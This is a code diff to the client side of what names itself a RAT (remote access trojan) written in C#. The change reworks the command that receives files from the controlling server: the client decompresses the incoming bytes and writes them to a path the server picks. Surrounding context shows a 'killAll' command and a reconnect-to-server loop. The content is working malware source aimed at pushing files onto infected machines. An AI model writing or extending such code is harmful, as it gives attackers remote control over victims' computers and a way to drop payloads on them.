@@ -3,6 +3,7 @@ using System.Data;
 using System.Net.Sockets;
 using System.IO;
 using System.Diagnostics;
+using System.IO.Compression;
 using System.Linq;
 using System.Net;
 
@@ -63,6 +64,7 @@ namespace RAT_clientside
                         try
                         {
                             cmd = sr.ReadLine();
+                            Console.WriteLine(cmd);
                         }
                         catch (Exception e)
                         {
@@ -95,19 +97,21 @@ namespace RAT_clientside
 
                         if (cmd.StartsWith("S"))
                         {
-                            string[] sendArgs = cmd.Split(Convert.ToChar("_"));
+                            string[] recvArgs = new string[2];
+                            recvArgs = cmd.Split(new char[]{Convert.ToChar("*")});
 
-                            string fileName = sendArgs[1];
-                            string dataString = sendArgs[2];
+                            int length = Convert.ToInt32(sr.ReadLine());
+                            byte[] data = new byte[length];
 
-                            byte[] data = dataString
-                                .Split(Convert.ToChar("+"))
-                                .Select(item => byte.Parse(item))
-                                .ToArray();
+                            for (int i = 0; i < data.Length; i++)
+                            {
+                                data[i] = Convert.ToByte(sr.ReadLine());
+                            }
 
-                            File.WriteAllBytes(fileName, data);
+                            File.WriteAllBytes(recvArgs[1], decompressBytes(data));
 
-                            output = fileName;
+                            output = "Recived " + data.Length + " bytes!";
+
                         }
 
                         if (cmd.StartsWith("killAll"))
@@ -136,6 +140,17 @@ namespace RAT_clientside
                 } //Try to connect to the server
 
             }
+        }
+
+        public static byte[] decompressBytes(byte[] data)
+        {
+            MemoryStream input = new MemoryStream(data);
+            MemoryStream output = new MemoryStream();
+            using (DeflateStream ds = new DeflateStream(input, CompressionMode.Decompress))
+            {
+                ds.CopyTo(output);
+            }
+            return output.ToArray();
         }
     }
 
